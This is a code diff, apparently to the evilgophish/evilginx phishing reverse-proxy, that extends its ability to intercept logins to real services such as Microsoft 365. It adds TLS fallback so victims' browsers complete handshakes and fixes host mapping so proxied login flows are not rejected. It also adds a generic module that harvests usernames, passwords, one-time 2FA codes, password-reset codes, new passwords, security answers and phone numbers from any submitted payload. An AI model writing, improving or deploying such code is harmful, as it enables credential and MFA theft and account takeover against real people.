-						   if err == nil {
-							   for kk, vv := range params {
-								   log.Debug("param: %s='%s'", kk, vv[0])
-
-								   session.Params[kk] = vv[0]
-							   }
-							   ret = true
-							   break
-						   }
-					   }
-				   }
-			   }
-		   }*/
 	return ret
 }
 
@@ -1613,7 +1800,13 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 			var h string
 			if c_type == CONVERT_TO_ORIGINAL_URLS {
 				h = combineHost(ph.phish_subdomain, phishDomain)
-				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
+				// several originals may share one phish host: keep the FIRST
+				// match in YAML order (the primary/landing endpoint) instead of
+				// letting later entries overwrite it, so the conversion is
+				// deterministic and round-trips the primary endpoint
+				if _, exists := sub_map[h]; !exists {
+					sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
+				}
 			} else {
 				h = combineHost(ph.orig_subdomain, ph.domain)
 				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
@@ -1652,39 +1845,71 @@ func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
 
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
 	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
-		parts := strings.SplitN(host, ":", 2)
-		hostname := parts[0]
-		port := 443
-		if len(parts) == 2 {
-			port, _ = strconv.Atoi(parts[1])
-		}
-
 		tls_cfg := &tls.Config{}
 		if !p.developer {
 
-			tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
+			tls_cfg.GetCertificate = func(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
+				cert, err := p.crt_db.magic.GetCertificate(hello)
+				if err == nil && cert != nil {
+					return cert, nil
+				}
+
+				// no cached/managed certificate for this hostname (e.g. a redirected
+				// subdomain that is not listed in the phishlet, or a local test host
+				// that Let's Encrypt cannot validate). Fall back to a locally issued
+				// certificate so the victim's browser is never left with a dead TLS
+				// handshake. The evilgophish root CA (see <data>/cert/ca.crt) must be
+				// installed in the browser's trust store for this chain to validate.
+				if hello != nil && hello.ServerName != "" {
+					hostname := strings.ToLower(hello.ServerName)
+					base_domain := strings.ToLower(p.cfg.GetBaseDomain())
+					if base_domain != "" && (hostname == base_domain || strings.HasSuffix(hostname, "."+base_domain)) {
+						fallback, ferr := p.crt_db.getSelfSignedCertificate(hostname, "", 443)
+						if ferr == nil && fallback != nil {
+							return fallback, nil
+						}
+					}
+				}
+				return cert, err
+			}
 			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol} //append(tls_cfg.NextProtos, tlsalpn01.ACMETLS1Protocol)
 
 			return tls_cfg, nil
 		} else {
-			var ok bool
-			phish_host := ""
-			if !p.cfg.IsLureHostnameValid(hostname) {
-				phish_host, ok = p.replaceHostWithPhished(hostname)
-				if !ok {
-					log.Debug("phishing hostname not found: %s", hostname)
-					return nil, fmt.Errorf("phishing hostname not found")
-				}
-			}
-
-			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
-			if err != nil {
-				log.Error("http_proxy: %s", err)
-				return nil, err
-			}
+			// Developer / no-autocert mode. Choose the certificate from the client's
+			// SNI (the phish hostname the browser actually connected to) instead of
+			// the CONNECT host (the original upstream hostname). Several phishlets
+			// can share the same orig host (e.g. o365 and o3652 both proxy
+			// login.microsoftonline.com) while using different phish hostnames; keying
+			// off SNI keeps the served certificate CN deterministic per phishlet.
 			return &tls.Config{
 				InsecureSkipVerify: true,
-				Certificates:       []tls.Certificate{*cert},
+				GetCertificate: func(hello *tls.ClientHelloInfo) (*tls.Certificate, error) {
+					if hello == nil || hello.ServerName == "" {
+						return nil, fmt.Errorf("no SNI in client hello")
+					}
+					sni_host := strings.ToLower(hello.ServerName)
+					orig_host := ""
+					phish_host := ""
+					if !p.cfg.IsLureHostnameValid(sni_host) {
+						o_host, ok := p.replaceHostWithOriginal(sni_host)
+						if !ok {
+							log.Debug("phishing hostname not found: %s", sni_host)
+							return nil, fmt.Errorf("phishing hostname not found")
+						}
+						orig_host = o_host
+						phish_host = sni_host
+					} else {
+						orig_host = sni_host
+					}
+					cert, err := p.crt_db.getSelfSignedCertificate(orig_host, phish_host, 443)
+					if err != nil {
+						log.Error("http_proxy: %s", err)
+						return nil, err
+					}
+					return cert, nil
+				},
+				NextProtos: []string{"http/1.1"},
 			}, nil
 		}
 	}
@@ -1733,6 +1958,9 @@ func (p *HttpProxy) httpsWorker() {
 	for p.isRunning {
 		c, err := p.sniListener.Accept()
 		if err != nil {
+			if !p.isRunning {
+				return
+			}
 			log.Error("Error accepting connection: %s", err)
 			continue
 		}
@@ -1774,7 +2002,6 @@ func (p *HttpProxy) httpsWorker() {
 		}(c)
 	}
 }
-
 func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
@@ -1789,6 +2016,9 @@ func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
 }
 
 func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
+	if p.cfg.PortTolerance() {
+		hostname = stripHostPort(hostname)
+	}
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
@@ -1826,6 +2056,9 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 		prefix = "."
 		hostname = hostname[1:]
 	}
+	if p.cfg.PortTolerance() {
+		hostname = stripHostPort(hostname)
+	}
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
@@ -1842,6 +2075,43 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 	return hostname, false
 }
 
+// replaceHostWithOriginalForSession resolves a phish hostname back to an
+// original hostname using the phishlet that owns the current session, taking
+// the FIRST matching proxy host in YAML order. Several originals may share
+// one phish host (e.g. o365 maps login.microsoftonline.com,
+// login.microsoft.com, login.windows.net and login.windowsazure.com all to
+// login.ms.tsl2...). The map-iterating replaceHostWithOriginal answers such
+// lookups RANDOMLY on every call, so consecutive requests of one flow (page,
+// XHR, form post) were forwarded to DIFFERENT upstream backends and the
+// Origin header could disagree with the request Host - the identity provider
+// then rejects calls like /common/GetCredentialType ("There was an issue
+// looking up your account"). First-match in slice order is deterministic and
+// prefers the phishlet's primary (usually landing) endpoint.
+func (p *HttpProxy) replaceHostWithOriginalForSession(hostname string, phishletName string) (string, bool) {
+	if phishletName != "" {
+		if pl, ok := p.cfg.phishlets[phishletName]; ok && p.cfg.IsSiteEnabled(phishletName) {
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if ok {
+				prefix := ""
+				h := hostname
+				if h != "" && h[0] == '.' {
+					prefix = "."
+					h = h[1:]
+				}
+				if p.cfg.PortTolerance() {
+					h = stripHostPort(h)
+				}
+				for _, ph := range pl.proxyHosts {
+					if h == combineHost(ph.phish_subdomain, phishDomain) {
+						return prefix + combineHost(ph.orig_subdomain, ph.domain), true
+					}
+				}
+			}
+		}
+	}
+	return p.replaceHostWithOriginal(hostname)
+}
+
 func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 	if hostname == "" {
 		return hostname, false
@@ -1850,6 +2120,9 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 	if hostname[0] == '.' {
 		prefix = "."
 		hostname = hostname[1:]
+	}
+	if p.cfg.PortTolerance() {
+		hostname = stripHostPort(hostname)
 	}
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
@@ -1870,6 +2143,51 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 	return hostname, false
 }
 
+// replaceHostWithPhishedForSession resolves the phished host for an upstream hostname preferring
+// the phishlet that owns the current session. When several enabled phishlets claim the same
+// orig host (e.g. o365 and o3652 both serve login.microsoftonline.com), routing the rewrite
+// through the session's phishlet keeps each flow deterministic instead of racy (map iteration).
+func (p *HttpProxy) replaceHostWithPhishedForSession(hostname string, phishletName string) (string, bool) {
+	if phishletName != "" {
+		if pl, ok := p.cfg.phishlets[phishletName]; ok && p.cfg.IsSiteEnabled(phishletName) {
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if ok {
+				prefix := ""
+				h := hostname
+				if h != "" && h[0] == '.' {
+					prefix = "."
+					h = h[1:]
+				}
+				if p.cfg.PortTolerance() {
+					h = stripHostPort(h)
+				}
+				for _, ph := range pl.proxyHosts {
+					if h == combineHost(ph.orig_subdomain, ph.domain) {
+						return prefix + combineHost(ph.phish_subdomain, phishDomain), true
+					}
+					if h == ph.domain {
+						return prefix + phishDomain, true
+					}
+				}
+			}
+		}
+	}
+	return p.replaceHostWithPhished(hostname)
+}
+
+func (p *HttpProxy) getPhishletByOrigHostForSession(hostname string, phishletName string) *Phishlet {
+	if phishletName != "" {
+		if pl, ok := p.cfg.phishlets[phishletName]; ok && p.cfg.IsSiteEnabled(phishletName) {
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+					return pl
+				}
+			}
+		}
+	}
+	return p.getPhishletByOrigHost(hostname)
+}
+
 func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
 	r_url, err := url.Parse(u)
 	if err == nil {
@@ -1882,6 +2200,9 @@ func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
 }
 
 func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
+	if p.cfg.PortTolerance() {
+		hostname = stripHostPort(hostname)
+	}
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
@@ -1915,6 +2236,9 @@ func (p *HttpProxy) getHomeDir() string {
 }
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
+	if p.cfg.PortTolerance() {
+		hostname = stripHostPort(hostname)
+	}
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
@@ -1932,6 +2256,9 @@ func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 }
 
 func (p *HttpProxy) handleSession(hostname string) bool {
+	if p.cfg.PortTolerance() {
+		hostname = stripHostPort(hostname)
+	}
 	for site, pl := range p.cfg.phishlets {
 		if p.cfg.IsSiteEnabled(site) {
 			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
@@ -1983,6 +2310,55 @@ func (p *HttpProxy) injectOgHeaders(l *Lure, body []byte) []byte {
 func (p *HttpProxy) Start() error {
 	go p.httpsWorker()
 	return nil
+}
+
+// SetProxy enables or disables the optional upstream proxy using the values
+// from the current proxy configuration. This is the programmatic equivalent
+// of the 'proxy enable'/'proxy disable' terminal commands.
+func (p *HttpProxy) SetProxy(enabled bool) error {
+	return p.setProxy(enabled, p.cfg.proxyConfig.Type, p.cfg.proxyConfig.Address, p.cfg.proxyConfig.Port, p.cfg.proxyConfig.Username, p.cfg.proxyConfig.Password)
+}
+
+// ManageCertificates sets up TLS certificates for all active hostnames
+// (managed mode) or the local certificate store (unmanaged mode). It is a
+// no-op in developer mode. This is the programmatic equivalent of the
+// 'test-certs' terminal command and of the certificate setup performed at
+// terminal startup.
+func (p *HttpProxy) ManageCertificates(verbose bool) {
+	if p.developer {
+		return
+	}
+	if p.cfg.IsAutocertEnabled() {
+		hosts := p.cfg.GetActiveHostnames("")
+		if verbose {
+			log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
+		}
+		err := p.crt_db.setManagedSync(hosts, 60*time.Second)
+		if err != nil {
+			log.Error("failed to set up TLS certificates: %s", err)
+			log.Error("run 'test-certs' command to retry")
+			return
+		}
+		if verbose {
+			log.Info("successfully set up all TLS certificates")
+		}
+	} else {
+		err := p.crt_db.setUnmanagedSync(verbose)
+		if err != nil {
+			log.Error("failed to set up TLS certificates: %s", err)
+			log.Error("run 'test-certs' command to retry")
+			return
+		}
+	}
+}
+
+// Shutdown stops the HTTPS MITM listener. In-flight connections are left to
+// terminate naturally; callers should stop long-running handlers first.
+func (p *HttpProxy) Shutdown() {
+	p.isRunning = false
+	if p.sniListener != nil {
+		p.sniListener.Close()
+	}
 }
 
 func (p *HttpProxy) whitelistIP(ip_addr string, sid string, pl_name string) {
@@ -2108,4 +2484,332 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+// ---------------------------------------------------------------------------
+// Generic credential & password-reset capture
+//
+// Phishlets declare exact field names for username/password; when a target
+// changes its frontend, or when credentials are submitted through an
+// unexpected content type, the declared regexes may fail to match. These
+// helpers scan every submitted payload for well-known field names and record
+// hits in the session's custom fields and the persistent session store. This
+// keeps credential capture working for all phishlets and also records
+// password-reset flows (email, verification code, new password) without
+// needing a dedicated phishlet section.
+
+var genericFormRe = regexp.MustCompile(`application/x-www-form-urlencoded|multipart/form-data|text/plain`)
+
+var genericJSONRe = regexp.MustCompile(`application/\w*\+?json`)
+
+var genericUsernameRe = regexp.MustCompile(`(?i)^(login|username|user|email|mail|user_email|identifier|loginfmt|session_key|session\[username_or_email\]|username_or_email|UserName|userid|login_email|membername|email_address|login_name|loginName|acc|acct|account|log|u|pass_username)$`)
+
+var genericPasswordRe = regexp.MustCompile(`(?i)^(pass|password|passwd|pwd|passd|session\[password\]|session_password|login_password|enc_password|unenc_password|Password|log_password|current_password|currentPassword|pass_code)$`)
+
+var genericCodeRe = regexp.MustCompile(`(?i)^(code|otp|otp_code|otc|onetime_code|onetimecode|one_time_code|oneTimeCode|2fa|2fa_code|two_factor|mfa|mfa_code|totp|totp_code|sms_code|verification_code|verificationCode|verify_code|security_code|securityCode|sixDigitCode|six_digit_code|challenge_code|pin|auth_code|authCode|user_code|captcha)$`)
+
+var genericNewPasswordRe = regexp.MustCompile(`(?i)^(new_password|newPassword|new-password|newpass|newpwd|newpw|pass2|repassword|confirm_password|confirmPassword|confirm-password|confirmpwd|confirm_newpassword|repeat_password|repeatPassword|password2|new_pass|np|create_password|createPassword|setpassword|set_password)$`)
+
+var genericPhoneRe = regexp.MustCompile(`(?i)^(phone|tel|telephone|mobile|mobile_number|phone_number|contact_phone|cellphone|cell|mobil)$`)
+
+var genericSecurityAnswerRe = regexp.MustCompile(`(?i)^(answer|security_answer|securityAnswer|hint_answer|challenge_answer)$`)
+
+var resetPathRe = regexp.MustCompile(`(?i)(forgot|reset|recover|recovery|acsr|verify|validate|challenge|passwordreset|createpassword|updatepassword|changepassword|resetpassword|recovery-options|signin/recovery|signin/challenge|password/change|change.?password|update.?password)`)
+
+var looksLikeEmailRe = regexp.MustCompile(`^[^@\s]+@[^@\s]+\.[^@\s]+$`)
+
+// flattenJSONMap flattens a decoded JSON value into a flat "key => value"
+// map so generic field capture can match nested JSON payloads.
+func flattenJSONMap(prefix string, v interface{}, out map[string]string) {
+	switch t := v.(type) {
+	case map[string]interface{}:
+		for k, val := range t {
+			p := k
+			if prefix != "" {
+				p = prefix + "." + k
+			}
+			flattenJSONMap(p, val, out)
+		}
+	case []interface{}:
+		for i, val := range t {
+			p := prefix + "[" + strconv.Itoa(i) + "]"
+			flattenJSONMap(p, val, out)
+		}
+	case string:
+		if prefix != "" {
+			out[prefix] = t
+		}
+	case float64:
+		if prefix != "" {
+			out[prefix] = strconv.FormatFloat(t, 'f', -1, 64)
+		}
+	case bool:
+		if prefix != "" {
+			out[prefix] = strconv.FormatBool(t)
+		}
+	}
+}
+
+// leafFieldKey strips flattenJSONMap prefixes ("parent.child", "list[0].key")
+// so well-known field names also match when they are nested inside a JSON
+// payload (e.g. "credentials.otc" -> "otc"). Plain form keys pass through.
+func leafFieldKey(k string) string {
+	if i := strings.LastIndex(k, "."); i >= 0 {
+		k = k[i+1:]
+	}
+	if i := strings.Index(k, "["); i >= 0 {
+		k = k[:i]
+	}
+	return k
+}
+
+func resetFlowPath(path string) bool {
+	return resetPathRe.MatchString(path)
+}
+
+// captureGenericFields scans a POST payload (form-encoded or JSON) for
+// well-known credential and password-reset field names and records matches in
+// both the in-memory session and the persistent session store. It is a
+// fallback that complements - and never replaces - the phishlet-declared
+// capture logic.
+func (p *HttpProxy) captureGenericFields(s *Session, sid string, path string, body []byte, contentType string) {
+	if s == nil || sid == "" {
+		return
+	}
+
+	values := make(map[string]string)
+
+	if genericJSONRe.MatchString(contentType) {
+		var data interface{}
+		if err := json.Unmarshal(body, &data); err == nil {
+			flattenJSONMap("", data, values)
+		}
+	} else if genericFormRe.MatchString(contentType) {
+		vals, err := url.ParseQuery(string(body))
+		if err == nil {
+			for k, v := range vals {
+				if len(v) > 0 {
+					values[k] = v[0]
+				}
+			}
+		}
+		// a JSON payload may arrive with a form-ish content type - fall back
+		// to JSON parsing when nothing form-like was extracted
+		if len(values) == 0 && len(body) > 0 {
+			var data interface{}
+			if err := json.Unmarshal(body, &data); err == nil {
+				flattenJSONMap("", data, values)
+			}
+		}
+	} else if len(body) > 0 {
+		// unknown content type - try to interpret the payload as url-encoded
+		// form data first, then as JSON, so no submitted credentials are missed
+		vals, err := url.ParseQuery(string(body))
+		if err == nil && len(vals) > 0 {
+			for k, v := range vals {
+				if len(v) > 0 {
+					values[k] = v[0]
+				}
+			}
+		} else {
+			var data interface{}
+			if err := json.Unmarshal(body, &data); err == nil {
+				flattenJSONMap("", data, values)
+			}
+		}
+	}
+
+	isReset := resetFlowPath(path)
+
+	maxVLen := func(v string) bool { return len(v) <= 512 }
+
+	// email / username - only if the phishlet itself did not capture it yet
+	if s.Username == "" {
+		for k, v := range values {
+			lk := leafFieldKey(k)
+			if genericUsernameRe.MatchString(lk) && v != "" && maxVLen(v) && len(v) < 256 {
+				s.SetUsername(v)
+				if err := p.db.SetSessionUsername(sid, v); err != nil {
+					log.Error("database: %v", err)
+				}
+				log.Success("[generic] Username: [%s]", v)
+				if s.Password != "" && len(s.RId) > 0 {
+					err := database.HandleSubmittedData(s.RId, s.Username, s.Password, s.Browser, p.livefeed)
+					if err != nil {
+						fmt.Printf("Error submitting data to database: %s\n", err)
+					}
+				}
+				if strings.Contains(v, "@") {
+					p.setSessionField(s, sid, "email", v)
+				}
+				break
+			}
+		}
+
+		if s.Username == "" {
+			// fallback: an email-looking value inside e.g. Google's f.req payload
+			for _, v := range values {
+				if v != "" && len(v) < 256 && looksLikeEmailRe.MatchString(v) {
+					s.SetUsername(v)
+					if err := p.db.SetSessionUsername(sid, v); err != nil {
+						log.Error("database: %v", err)
+					}
+					log.Success("[generic] Username (email fallback): [%s]", v)
+					if s.Password != "" && len(s.RId) > 0 {
+						err := database.HandleSubmittedData(s.RId, s.Username, s.Password, s.Browser, p.livefeed)
+						if err != nil {
+							fmt.Printf("Error submitting data to database: %s\n", err)
+						}
+					}
+					p.setSessionField(s, sid, "email", v)
+					break
+				}
+			}
+		}
+	}
+
+	// password - only if the phishlet itself did not capture it yet
+	if s.Password == "" {
+		for k, v := range values {
+			if genericPasswordRe.MatchString(leafFieldKey(k)) && v != "" && maxVLen(v) {
+				s.SetPassword(v)
+				if err := p.db.SetSessionPassword(sid, v); err != nil {
+					log.Error("database: %v", err)
+				}
+				log.Success("[generic] Password: [%s]", v)
+				if s.Username != "" && len(s.RId) > 0 {
+					err := database.HandleSubmittedData(s.RId, s.Username, s.Password, s.Browser, p.livefeed)
+					if err != nil {
+						fmt.Printf("Error submitting data to database: %s\n", err)
+					}
+				}
+				break
+			}
+		}
+	}
+
+	// verification / 2FA & password-reset flow fields
+	for k, v := range values {
+		if v == "" || !maxVLen(v) {
+			continue
+		}
+		lk := leafFieldKey(k)
+		if genericCodeRe.MatchString(lk) {
+			if isReset {
+				p.setSessionField(s, sid, "reset_code", v)
+			} else {
+				p.setSessionField(s, sid, "verification_code", v)
+			}
+			continue
+		}
+		if genericNewPasswordRe.MatchString(lk) {
+			p.setSessionField(s, sid, "new_password", v)
+			continue
+		}
+		if isReset && genericPasswordRe.MatchString(lk) {
+			// during a reset flow a plain password field is the new password
+			p.setSessionField(s, sid, "new_password", v)
+			continue
+		}
+		if genericSecurityAnswerRe.MatchString(lk) {
+			p.setSessionField(s, sid, "security_answer", v)
+			continue
+		}
+		if genericPhoneRe.MatchString(lk) && len(v) >= 7 && len(v) <= 16 {
+			p.setSessionField(s, sid, "phone", v)
+			continue
+		}
+		if isReset && genericUsernameRe.MatchString(lk) {
+			// during a reset flow the email field is the account being recovered
+			p.setSessionField(s, sid, "reset_email", v)
+		}
+	}
+
+	if isReset {
+		p.setSessionField(s, sid, "reset_flow", path)
+	}
+}
+
+// setSessionField updates both the in-memory session custom fields and the
+// persistent session store.
+func (p *HttpProxy) setSessionField(s *Session, sid string, name string, value string) {
+	if s == nil || sid == "" || name == "" || value == "" {
+		return
+	}
+	s.SetCustom(name, value)
+	if err := p.db.SetSessionCustom(sid, name, value); err != nil {
+		log.Error("database: %v", err)
+	}
+}
+
+// decodeResponseBody decompresses gzip/deflate response bodies and strips the
+// related headers so the filtering pipeline sees plaintext. It returns false
+// when the body must be left untouched (unknown encoding, corrupt data) - the
+// original bytes are then forwarded as-is and the page still renders.
+func decodeResponseBody(resp *http.Response, body []byte) ([]byte, bool) {
+	enc := strings.ToLower(strings.TrimSpace(resp.Header.Get("Content-Encoding")))
+	if enc == "" || enc == "identity" {
+		return body, false
+	}
+	// only handle a single gzip/deflate layer; anything else stays untouched
+	if strings.Contains(enc, ",") {
+		return body, false
+	}
+	var out []byte
+	switch enc {
+	case "gzip":
+		zr, err := gzip.NewReader(bytes.NewReader(body))
+		if err != nil {
+			return body, false
+		}
+		out, err = ioutil.ReadAll(zr)
+		zr.Close()
+		if err != nil {
+			return body, false
+		}
+	case "deflate":
+		zr, err := zlib.NewReader(bytes.NewReader(body))
+		if err != nil {
+			return body, false
+		}
+		out, err = ioutil.ReadAll(zr)
+		zr.Close()
+		if err != nil {
+			return body, false
+		}
+	default:
+		return body, false
+	}
+	resp.Header.Del("Content-Encoding")
+	resp.Header.Del("Content-Length")
+	return out, true
+}
+
+// decompressBody tries to decompress a request body based on its Content-Encoding
+// header value. On any failure it returns the body untouched - the original bytes
+// are simply not decodable by us and will be forwarded as-is.
+func decompressBody(body []byte, enc string) []byte {
+	enc = strings.ToLower(strings.TrimSpace(enc))
+	enc = strings.SplitN(enc, ",", 2)[0]
+	switch enc {
+	case "gzip":
+		zr, err := gzip.NewReader(bytes.NewReader(body))
+		if err == nil {
+			defer zr.Close()
+			out, err2 := ioutil.ReadAll(zr)
+			if err2 == nil {
+				return out
+			}
+		}
+	case "deflate":
+		zr, err := zlib.NewReader(bytes.NewReader(body))
+		if err == nil {
+			defer zr.Close()
+			out, err2 := ioutil.ReadAll(zr)
+			if err2 == nil {
+				return out
+			}
+		}
+	}
+	return body
 }
